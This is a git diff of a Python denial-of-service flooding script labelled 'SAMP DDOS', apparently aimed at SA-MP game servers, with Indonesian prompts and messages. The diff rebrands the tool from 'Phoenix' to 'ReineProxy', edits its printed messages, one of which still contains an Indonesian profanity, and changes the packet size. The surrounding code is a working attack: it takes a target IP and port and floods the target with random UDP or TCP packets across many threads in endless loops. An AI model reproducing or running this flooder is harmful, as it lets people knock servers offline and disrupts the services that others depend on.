@@ -6,7 +6,7 @@ import os
 import sys
 
 os.system("clear")
-print("Tools by Phoenix")
+print("Tools by ReineProxy")
 print("#-- SAMP DDOS --#")
 ip = str(input(" IP:"))
 port = int(input(" Port:"))
@@ -14,7 +14,7 @@ choice = str(input(" UDP(y/n):"))
 times = int(input(" Paket yang dikirim :"))
 threads = int(input(" Utas (saran : 99999) :"))
 def run():
-	data = random._urandom(1024)
+	data = random._urandom(1025)
 	i = random.choice(("[*]","[!]","[#]"))
 	while True:
 		try:
@@ -22,9 +22,9 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" PAKET FROM OCTRA NIH DEK")
+			print(i +" PAKET FROM REINE")
 		except:
-			print("YAH GAK KUAT KONTOL")
+			print("YAH GA KUAT:)")
 
 def run2():
 	data = random._urandom(16)
@@ -36,7 +36,7 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" PAKET FROM OCTRA NIH DEK")
+			print(i +" PAKET FROM REINE")
 		except:
 			s.close()
 			print("YAH GAK KUAT KONTOL")
